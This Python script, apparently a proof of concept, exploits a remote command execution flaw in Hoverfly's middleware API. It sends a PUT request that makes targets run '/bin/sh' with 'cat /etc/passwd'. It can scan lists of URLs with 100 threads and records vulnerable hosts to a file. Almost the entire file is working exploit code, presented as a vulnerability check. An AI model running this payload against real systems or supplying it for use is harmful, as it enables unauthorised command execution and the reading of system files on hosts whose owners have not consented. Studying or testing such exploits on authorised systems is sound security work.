import requests,json,urllib3,warnings,argparse,sys
from multiprocessing.dummy import Pool  #多线程库
import colorama
from colorama import Fore   #字体颜色

def banner():
    text = """
 ___ ___                            _____.__         
 /   |   \  _______  __ ____________/ ____\  | ___.__.
/    ~    \/  _ \  \/ // __ \_  __ \   __\|  |<   |  |
\    \    (  <_> )   /\  ___/|  | \/|  |  |  |_\___  |
 \___|_  / \____/ \_/  \___  >__|   |__|  |____/ ____|
       \/                  \/                  \/     
                                        author:eagle
       """     
    print(text)

def main():
    banner()
    parse = argparse.ArgumentParser(description='Hoverfly远程命令执行检测')
    parse.add_argument('-u','--url',dest='url',type=str,help='Pleasr input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='Please input your filename')
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f'Usage python {sys.argv[0]} -h')
def poc(target):
    link = '/api/v2/hoverfly/middleware'
    headers = {
        'Content-Type': 'application/json',
        'Connection': 'close'
             }
    data ={
        "binary": "/bin/sh",
        "script": "cat /etc/passwd"
                }
    try:
        res1 =  requests.get(url=target,headers=headers,timeout=5,verify=False)
        if res1.status_code == 200:
            res2 = requests.put(url=target+link,json=data,headers=headers,timeout=5,verify=False)
            res2_json = json.loads(res2.text)
            if 'STDOUT' in res2_json['error']:
               print(Fore.RED + f'[+]{target}存在漏洞' + Fore.RESET)
               with open('result.txt','a',encoding='utf-8') as fp:
                   fp.write(f'[+]{target}存在漏洞')
            else:
                    print(f'[-]{target}不存在漏洞')
    except:
        print(f'[!]{target}存在异常，请手动测试')
if __name__ == '__main__':
    main()